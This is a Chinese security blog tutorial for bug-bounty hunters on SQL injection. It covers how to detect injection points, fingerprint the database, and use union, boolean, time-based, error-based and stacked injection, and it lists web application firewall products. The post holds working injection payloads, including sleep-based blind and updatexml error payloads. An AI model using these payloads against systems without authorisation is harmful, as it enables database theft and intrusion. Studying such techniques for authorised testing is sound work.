class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url">SRC漏洞挖掘</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">【SRC】SQL注入漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-02T05:25:14.000Z" title="发表于 2024-07-02 13:25:14">2024-07-02</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-07-02T05:31:28.940Z" title="更新于 2024-07-02 13:31:28">2024-07-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="【SRC】SQL注入漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202404092014272.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/7410.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url">SRC漏洞挖掘</a><h1 id="CrawlerTitle" itemprop="name headline">【SRC】SQL注入漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2024-07-02T05:25:14.000Z" title="发表于 2024-07-02 13:25:14">2024-07-02</time><time itemprop="dateCreated datePublished" datetime="2024-07-02T05:31:28.940Z" title="更新于 2024-07-02 13:31:28">2024-07-02</time></header><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SQL注入就是供助网站上不健全的SQL拼接语句，将攻击者自己的payload拼接到原有的SQL语句中，使其在服务器上执行恶意SQL语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。</p>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul>
<li>脱库</li>
<li>查询隐藏数据，企业对于用户数据并不会直接删除，而是通过delete等字段去控制其是否可见，这里利用的就是这一特性</li>
<li>新增管理账户</li>
<li>甚至极端条件下还可以完成getshell,获取服务器权限。</li>
</ul>
<h1 id="一般挖掘"><a href="#一般挖掘" class="headerlink" title="一般挖掘"></a>一般挖掘</h1><h2 id="1、判断是否存在注入点"><a href="#1、判断是否存在注入点" class="headerlink" title="1、判断是否存在注入点"></a>1、判断是否存在注入点</h2><p>?id&#x3D;1&#x2F;1&#x3D;1发现存在注入点</p>
<p>1、数字型<br>2、&#x2F;法可用<br>3、存在注入点</p>
<p>?id&#x3D;1&#x2F;1&#x3D;1  id&#x3D;1a  ?id&#x3D;1  e </p>
<p>?id&#x3D;2&#x2F;1&#x3D;2  id&#x3D;2b  ?id&#x3D;2  f</p>
<p>数字型<br>?id&#x3D;1<br>?id&#x3D;1+0 界面不发生改变，<br>?id&#x3D;1+1 界面发生改变，并且直接界面变为id&#x3D;2<br>?id&#x3D;1’     界面发生改变，数据包的长度发生改变<br>?id&#x3D;1’      200<br>?id&#x3D;1”     300<br>?id&#x3D;1’”    200<br>?id&#x3D;1””   300</p>
<h2 id="2、构造轮子-找到可执行的函数或方法"><a href="#2、构造轮子-找到可执行的函数或方法" class="headerlink" title="2、构造轮子-找到可执行的函数或方法"></a>2、构造轮子-找到可执行的函数或方法</h2><p>?id&#x3D;4&#x2F;if(2&#x3D;2,2,1)  ?id&#x3D;4&#x2F;2&#x3D;2  ?id&#x3D;2   e<br>?id&#x3D;4&#x2F;if(2&#x3D;1,1,1)  ?id&#x3D;4&#x2F;1&#x3D;4  ?id&#x3D;4   f</p>
<p>if语句可以使用</p>
<p>?id&#x3D;4&#x2F;if(lenth(123)&#x3D;1,1,0)  这一步证明lenth可以使用<br>?id&#x3D;4&#x2F;if(lenth(user)&#x3D;1,1,0)<br>?id&#x3D;4&#x2F;if(left(‘123’,1)&#x3D;1,1,0) 可以证明left语句使用<br>?id&#x3D;4&#x2F;if(left(user,1)&#x3D;’a’,1,1)这一步去证明user可以使用</p>
<h2 id="3、跑数据或拿权限造成进一步的危害"><a href="#3、跑数据或拿权限造成进一步的危害" class="headerlink" title="3、跑数据或拿权限造成进一步的危害"></a>3、跑数据或拿权限造成进一步的危害</h2><p>?id&#x3D;4&#x2F;if(left(user,z)&#x3D;’t’,1,1)</p>
<p>跑两个参数</p>
<p>z：1-10</p>
<p>t：0-1 a-z A-Z</p>
<p>if+sellp</p>
<p>user第一个字母为a 就睡眠5秒</p>
<p>a、v、u都睡眠5秒</p>
<p>?id&#x3D;2&#x2F;if(left(‘123’,1)&#x3D;1’,1,2)</p>
<p>?id&#x3D;2&#x2F;1</p>
<p>?id&#x3D;2&#x2F;2</p>
<p>?id&#x3D;2&#x2F;if(1&#x3D;1,1,2)</p>
<h1 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h1><h2 id="基于错误"><a href="#基于错误" class="headerlink" title="基于错误"></a>基于错误</h2><p>在参数后添加单引号或双引号甚至<code>+</code> <code>~</code> <code>*</code> <code>/</code>等形式，返回包直接显示数据库的语句错误或与数据库相关的<br>信息，这种情况值得研究，很有可能出货</p>
<p><code>select * where id=1+1</code></p>
<p>例：<code>id=1+1 select * where id=1+1</code></p>
<h2 id="基于内容"><a href="#基于内容" class="headerlink" title="基于内容"></a>基于内容</h2><p>基于内容的判断，一般与<code>+</code> <code>~</code> <code>*</code> <code>/</code>有关系</p>
<p>比如，id&#x3D;1 显示a界面</p>
<p>而id&#x3D;1+1显示b界面</p>
<p>这里100%就有注入，当然id&#x3D;1+1是正常的界面</p>
<p>id&#x3D;1</p>
<p>基于内容判断注入点也可以和f语句搭配，如if(1&#x3D;1,1,0)<br>?id&#x3D;1<br>?id&#x3D;if(1&#x3D;1,1,0)</p>
<p>上述两者是相同的回显，此情况下100%也是存在SQL注入的</p>
<h2 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h2><p>?id&#x3D;1+and+sleep(10) 页面成功回显且睡眠10秒那么也是证明存在注入点的</p>
<p>?id&#x3D;if(1&#x3D;1,sleep(10),1)</p>
<p>sleep(10)函数：执行此函数会导致页面睡眠10秒</p>
<p>?id&#x3D;1+and+sleep(10),若函数执行成功，页面会睡眠10秒</p>
<p>?id&#x3D;if(1&#x3D;1,sleep(10),1)</p>
<p>1&#x3D;1判断为真，返回为sleep(10)</p>
<p>若判断为假，则返回为1，即?id&#x3D;1</p>
<h1 id="判断数据库类型，能帮忙选择函数构造轮子"><a href="#判断数据库类型，能帮忙选择函数构造轮子" class="headerlink" title="判断数据库类型，能帮忙选择函数构造轮子"></a>判断数据库类型，能帮忙选择函数构造轮子</h1><h2 id="端口判断"><a href="#端口判断" class="headerlink" title="端口判断"></a>端口判断</h2><ul>
<li>Oracle：1521</li>
<li>mssql：1433</li>
<li>Mysql：3306</li>
<li>eletricsearch：9200</li>
<li>redis：6379</li>
</ul>
<h2 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h2><ul>
<li>asp：SQL Server， Access</li>
<li>.net：SQL Server</li>
<li>php：Mysql，PostgreSql</li>
<li>java：Oracle，Mysql</li>
</ul>
<h2 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h2><ul>
<li>ORACLE</li>
</ul>
<p>ORA-00933:SQLcommand not properly ended</p>
<ul>
<li>MS-SQL</li>
</ul>
<p>Msg 170,level 15,State 1,Line 1<br>Line 1:Incorrect syntax near ‘foo</p>
<p>Msg 105,level 15,state 1,Line 1<br>Unclose quotation mark before the character string ‘foo</p>
<ul>
<li>MYSQL</li>
</ul>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ at line 1</p>
<h2 id="借助工具判断"><a href="#借助工具判断" class="headerlink" title="借助工具判断"></a>借助工具判断</h2><p>sqlmap</p>
<h2 id="借助注释符号"><a href="#借助注释符号" class="headerlink" title="借助注释符号"></a>借助注释符号</h2><p>“#”  MySQL</p>
<p>“null”和“%00”  Access</p>
<p>“–”  Oracle和MSSQL支持的注释符</p>
<p>“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库</p>
<h2 id="借助函数判断"><a href="#借助函数判断" class="headerlink" title="借助函数判断"></a>借助函数判断</h2><h3 id="len和lenth"><a href="#len和lenth" class="headerlink" title="len和lenth"></a>len和lenth</h3><p>mssql和mysql，len()函数</p>
<p>oracle length()</p>
<h3 id="version和version"><a href="#version和version" class="headerlink" title="@@version和version()"></a>@@version和version()</h3><p>mysql 两者都可<br>mssql @@version</p>
<h3 id="substring-substr"><a href="#substring-substr" class="headerlink" title="substring substr"></a>substring substr</h3><p>oracle substr<br>mssql substring</p>
<h1 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h1><p>从注入参数类型分：</p>
<p>数字型注入、字符型注入</p>
<p>从注入效果分：</p>
<p>报错注入、布尔注入、延时注入、联合注入、堆叠注入、宽字节注入</p>
<p>从提交方式分：</p>
<p>GET注入、POST注入、HTTP头注入、COOKIE注入</p>
<h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/122996953">https://blog.csdn.net/wangyuxiang946/article/details/122996953</a></p>
<p>后台对应的SQL如下，字段类型是数值型，这种就是数值型注入</p>
<p>select * from user where id &#x3D;1;</p>
<p>?id&#x3D;1’ “<br>?id&#x3D;1+1肯定就是数字型</p>
<p>?id&#x3D;1’a<br>?id&#x3D;1b<br>?id&#x3D;1”b 字符型的</p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/122996953">https://blog.csdn.net/wangyuxiang946/article/details/122996953</a></p>
<p>参数为字符</p>
<p>比如：输入的用户名和密码是字符串</p>
<h2 id="提交方式分"><a href="#提交方式分" class="headerlink" title="提交方式分"></a>提交方式分</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/122996953">https://blog.csdn.net/wangyuxiang946/article/details/122996953</a></p>
<p>GET注入：使用get请求提交数据，比如xxx.php?id&#x3D;1<br>POST注入：使用post请求提交数据，比如表单。<br>Cookie注入：使用Cookie的某个字段提交数据，比如在Cookie中保存用户信息。<br>HTTP Header注入：使用请求头提交数据，比如检测HTTP中的源地址、主机IP等</p>
<h2 id="根据页面回显分"><a href="#根据页面回显分" class="headerlink" title="根据页面回显分"></a>根据页面回显分</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/122996953">https://blog.csdn.net/wangyuxiang946/article/details/122996953</a></p>
<p>显注：前端页面可以回显用户信息，比如联合注入、报错注入。<br>盲注：前端页面不能回显用户信息，比如布尔盲注、时间盲注。sleep(3)</p>
<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>可合并多个查询的结果的合集，顾名思义，就是将一个表追加到另一个表后，从而实现查询结果组合在一起</p>
<p>在URL的参数位置中，将构造的语句注入到参数位置中</p>
<p>select (原始查询内容) union select (构造的内容)</p>
<p>Select from users where id&#x3D;(“-1”)union select 1,2,database()–+</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>①存在注入点，即未被过滤<br>②有显示位，即能回显结果<br>③两表列数相同，即order by或union select去判断列数<br>④数据类型相同</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1、判断是否存在注入点</p>
<p>(1)在参数位置修改参数值，eg：id&#x3D;1修改为2后是否数据改变<br>(2)插入单、双引号的检测方法(常用)，未闭合的单引号会引起 SQL语句单引号未闭合的错误提示</p>
<p>2、判断注入点还是整形或字符型-语句闭环<br>(1)数字型:通过 and 1&#x3D;1<br>(2)字符串型:闭合单引号测试语句 ‘and’1’&#x3D;’1 进行判断</p>
<p>3、判断查询列数<br>orderby 或union select</p>
<p>4、判断显示位</p>
<p>报错回显，用不存在的id&#x3D;-1 加上 union select….<br>或者 and1&#x3D;2 加上 union select..</p>
<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><p>当不知道数据库返回值的情况下时【无回显】</p>
<p>输入 1’and ‘1’&#x3D;’1和1’and ‘1’&#x3D;’2显示不一样，仅返回正确、或者错误的页面时，存在布尔型盲注入。</p>
<p>原理：假设1’为真，则:<br>1’and’1’&#x3D;’1 为真 返回正确的界面 ‘1’and’1’&#x3D;’1’<br>1’and’1’&#x3D;’2 为假 返回错误的界面 ‘1’and’1’&#x3D;’2’</p>
<h3 id="布尔型注入涉及函数"><a href="#布尔型注入涉及函数" class="headerlink" title="布尔型注入涉及函数"></a>布尔型注入涉及函数</h3><p>所涉及的函数:</p>
<p>①if() if(条件，结果1，结果2)如果条件成立，则输出结果1，否则输出结果 2</p>
<p>②字符串截取函数：SUBSTRING(参数1，参数 2，参数 3)left right</p>
<p>参数 1：字符串<br>参数 2：开始截取的第几个字符<br>参数 3：截取的长度</p>
<p>?id&#x3D;1and if(SUBSTRING(database(),1,1)&#x3D;’d’,1,0)–+</p>
<p>截断 database()的第一个字符，并判断，若&#x3D;d，则返回1，错误，返回 0</p>
<p>③获取长度函数：length()</p>
<p>通过构造以上函数可得:</p>
<p>if(SUBSTRING(参数 1，参数 2，参数 3),结果 1.结果 2)<br>if(length(),结果 1，结果 2)</p>
<p>相当于进行一个判断，判断成功为yes，错误为 no,可根据判断输入攻击性代码 得到数据</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>界面返回值只有一种，true 无论输入任何值返回情况都会按正常的来处理。</p>
<p>加入特定的时间函数，通过查看 web 页面返回的时间差来判断注入的语句是否正确。(BURP)</p>
<p>时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。</p>
<h3 id="判定条件"><a href="#判定条件" class="headerlink" title="判定条件"></a>判定条件</h3><p>什么情况下考虑使用时间盲注?<br>1.无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样2.不会回显注入语句执行结果，故无法使用 UNION 注入<br>3.不会显示报错信息，故无法使用报错注入<br>4.符合盲注的特征，但不属于布尔型盲注</p>
<h3 id="时间盲注与布尔盲注区别"><a href="#时间盲注与布尔盲注区别" class="headerlink" title="时间盲注与布尔盲注区别"></a>时间盲注与布尔盲注区别</h3><p>时间盲注根据页面返回的时间差判断<br>布尔盲注根据 yes 或 no 来判断</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>sleep(n):将程序挂起一段时间n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。</p>
<p>使用 sleep()函数和if()函数: <code>and(if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</code><br>如果返回正确则页面会停顿 10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</p>
<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>页面上没有显示位，但是必须有SQL语句执行错误的信息</p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>1、优点：不需要显示位，如果有显示位建议使用uion联合查询。<br>2、缺点：需要有SQL语句的报错信息。</p>
<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>①构造目标查询语句；<br>②选择报错注入函数；<br>③构造报错注入语句；<br>④拼接报错注入语句；</p>
<h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h3><p>floor();</p>
<p>extractvalue();</p>
<p>updatexml();</p>
<p>geometrycollection();</p>
<p>multipoint();</p>
<p>polygon();</p>
<p>multipolygon();</p>
<p>linestring();</p>
<p>multilinestring();</p>
<p>exp();</p>
<h3 id="报错注入函数详解"><a href="#报错注入函数详解" class="headerlink" title="报错注入函数详解"></a>报错注入函数详解</h3><p>①利用floor0函数进行报错注入</p>
<p>语法：UPDATEXML(xml_document，XPathstring，new_value)。</p>
<p>第一个参数：xml_document，文档名称。<br>第二个参数：XPathstring(Xpath格式的字符串)，做内容定位。<br>第三个参数：new_value，String格式，替换查找到的符合条件的值。</p>
<p>!注意：一次返回值最大为32位，当数据库名大于32，需要结合其他方式使用（可以使用substr(());</p>
<p>Payload<br><a target="_blank" rel="noopener" href="http://localhost/pikachu/vul/sqli/sqli_str.php?name=lili%27and">http://localhost/pikachu/vul/sqli/sqli_str.php?name=lili&#39;and</a> updatexml(1,concat(0x7e,(select database()),0x7e),1)–+&amp;submit&#x3D;</p>
<p>Updatexml(1,concat(0x7e,database(),0x7e),1)</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询</p>
<p>原理很简单，mysql_multi_query()支持多条 sql语句同时执行，就是个<code>;</code>分隔，成堆的执行sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;show databases;</span><br></pre></td></tr></table></figure>

<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够</p>
<p>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到 API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条 sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是 mysqli_query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="waf的定义"><a href="#waf的定义" class="headerlink" title="waf的定义"></a>waf的定义</h2><p>WAF(Web应用防火墙)是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。通俗来说就是WAF产品里集成了一定的检测规则，会对每个请求的内容根据生成的规则进行检测并对不符合安全规则的作出对应的防御处理，从而保证Web应用的安全性与合法性。</p>
<h2 id="处置流程"><a href="#处置流程" class="headerlink" title="处置流程"></a>处置流程</h2><p>预处理、规则检测、处理模块、日志记录</p>
<p>预处理：<br>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP&#x2F;HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Wb服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分</p>
<p>规则检测：<br>每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
<p>处理模块：<br>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。</p>
<p>日志记录：<br>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
<h2 id="判断waf的品牌"><a href="#判断waf的品牌" class="headerlink" title="判断waf的品牌"></a>判断waf的品牌</h2><p>1、判断是什么类型的waf是第一步</p>
<p>根据类型，可以选择payload，或者之前的积累，常见的waf</p>
<p><a target="_blank" rel="noopener" href="https://www.wangan.com/p/11v71302b8c5ab87">https://www.wangan.com/p/11v71302b8c5ab87</a></p>
<h3 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h3><p>云 WAF 主要利用 DNS 技术，通过移交域名解析权来实现安全防护，用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。</p>
<p>1、阿里云盾</p>
<p><a target="_blank" rel="noopener" href="http://aliyunyd.com/">http://aliyunyd.com/</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300032704.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300032799.png" alt="img"></p>
<p>2、腾讯 T-Sec Wb 应用防火墙</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/waf">https://cloud.tencent.com/product/waf</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300032825.png" alt="img"></p>
<p>3、华为 Web 应用防火墙 WAF</p>
<p><a target="_blank" rel="noopener" href="https://www.huaweicloud.com/product/waf.html">https://www.huaweicloud.com/product/waf.html</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300032049.png" alt="img"></p>
<p>4、安恒云 - Web 应用防火墙（玄武盾）平台</p>
<p><a target="_blank" rel="noopener" href="https://www.dbappsecurity.com.cn/product/cloud119.html">https://www.dbappsecurity.com.cn/product/cloud119.html</a></p>
<p>5、百度云应用防火墙 WAF</p>
<p><a target="_blank" rel="noopener" href="https://cloud.baidu.com/product/waf.html">https://cloud.baidu.com/product/waf.html</a></p>
<p>6、华为云 - 云防火墙 CFW</p>
<p><a target="_blank" rel="noopener" href="https://www.huaweicloud.com/product/cfw.html">https://www.huaweicloud.com/product/cfw.html</a></p>
<p>7、安全狗云御 WEB 应用防护系统</p>
<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/index/wafIndex.html">https://www.safedog.cn/index/wafIndex.html</a></p>
<p>8、知道创宇 - 创宇盾 Web 应用防火墙</p>
<p><a target="_blank" rel="noopener" href="https://defense.yunaq.com/cyd/">https://defense.yunaq.com/cyd/</a></p>
<p>9、F5 分布式云 WAF</p>
<p><a target="_blank" rel="noopener" href="https://www.f5.com.cn/cloud/products/distributed-cloud-waf">https://www.f5.com.cn/cloud/products/distributed-cloud-waf</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300032249.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300033452.png" alt="img"></p>
<p>10、奇安信网站卫士</p>
<p><a target="_blank" rel="noopener" href="https://wangzhan.qianxin.com/">https://wangzhan.qianxin.com/</a></p>
<p>11、360 磐云</p>
<p><a target="_blank" rel="noopener" href="https://wangzhan.360.cn/panyun">https://wangzhan.360.cn/panyun</a></p>
<p>12、网宿 Web 应用防火墙</p>
<p><a target="_blank" rel="noopener" href="https://www.wangsu.com/product/52">https://www.wangsu.com/product/52</a></p>
<p>13、奇安信网神 WEB 应用安全云防护系统（安域）</p>
<p><a target="_blank" rel="noopener" href="https://www.qianxin.com/product/detail/pid/400">https://www.qianxin.com/product/detail/pid/400</a></p>
<p>14、腾讯云 WAF</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202406300033648.png" alt="img"></p>
<p>16、腾讯门神</p>
<p>17、绿盟网站云防护</p>
<p><a target="_blank" rel="noopener" href="https://www.nsfocus.com.cn/html/2020/458_0107/108.html">https://www.nsfocus.com.cn/html/2020/458_0107/108.html</a></p>
<p>18、启明星辰虚拟化 WAF</p>
<p><a target="_blank" rel="noopener" href="https://www.venustech.com.cn/new_type/xnWAF/">https://www.venustech.com.cn/new_type/xnWAF/</a></p>
<p>19、深信服云 Web 应用防火墙云 WAF</p>
<p><a target="_blank" rel="noopener" href="https://www.sangfor.com.cn/product-and-solution/sangfor-security/yun-web">https://www.sangfor.com.cn/product-and-solution/sangfor-security/yun-web</a></p>
<p>20、瑞数动态 Web 应用防火墙（River Safeplus）</p>
<p><a target="_blank" rel="noopener" href="https://www.riversecurity.com/product-Safeplus.shtml">https://www.riversecurity.com/product-Safeplus.shtml</a></p>
<h3 id="硬件-WAF"><a href="#硬件-WAF" class="headerlink" title="硬件 WAF"></a>硬件 WAF</h3><p>硬件 WAF 通常部署在 Web 服务器之前，过滤所有外部访问流量，并对请求包进行解析，通过安全规则库的攻击规则进行匹配，识别异常并进行请求阻断。<br>常见产品：</p>
<p>1、安恒明御 Web 应用防火墙</p>
<p><a target="_blank" rel="noopener" href="https://www.dbappsecurity.com.cn/product/cloud150.html">https://www.dbappsecurity.com.cn/product/cloud150.html</a></p>
<p>2、长亭雷池 (SafeLine) 下一 代 Web 应用防火墙</p>
<p><a target="_blank" rel="noopener" href="https://www.chaitin.cn/zh/safeline">https://www.chaitin.cn/zh/safeline</a></p>
<p>3、铱迅 Web 应用防护系统</p>
<p><a target="_blank" rel="noopener" href="https://www.yxlink.com/index_product_index.html">https://www.yxlink.com/index_product_index.html</a></p>
<p>4、绿盟 Web 应用防护系统</p>
<p><a target="_blank" rel="noopener" href="https://www.nsfocus.com.cn/html/2019/206_0911/6.html">https://www.nsfocus.com.cn/html/2019/206_0911/6.html</a></p>
<p>5、远江盛邦 Web 应用防护系统 (RayWAF)</p>
<p><a target="_blank" rel="noopener" href="https://www.webray.com.cn/channel/RayWAF.html">https://www.webray.com.cn/channel/RayWAF.html</a></p>
<p>6、天融信 Web 应用安全防护系统 (TopWAF)</p>
<p><a target="_blank" rel="noopener" href="https://www.topsec.com.cn/product/25.html">https://www.topsec.com.cn/product/25.html</a></p>
<p>7、深信服 Web 应用防火墙 WAF</p>
<p><a target="_blank" rel="noopener" href="https://www.sangfor.com.cn/product-and-solution/sangfor-security/waf">https://www.sangfor.com.cn/product-and-solution/sangfor-security/waf</a></p>
<p>8、启明天清 Web 应用安全网关</p>
<p><a target="_blank" rel="noopener" href="https://www.venustech.com.cn/new_type/Webyyfhq/">https://www.venustech.com.cn/new_type/Webyyfhq/</a></p>
<p>9、E5 Advanced WAF (API 安全 - 新一代 WAF)</p>
<p><a target="_blank" rel="noopener" href="https://www.f5.com.cn/products/security/advanced-waf">https://www.f5.com.cn/products/security/advanced-waf</a></p>
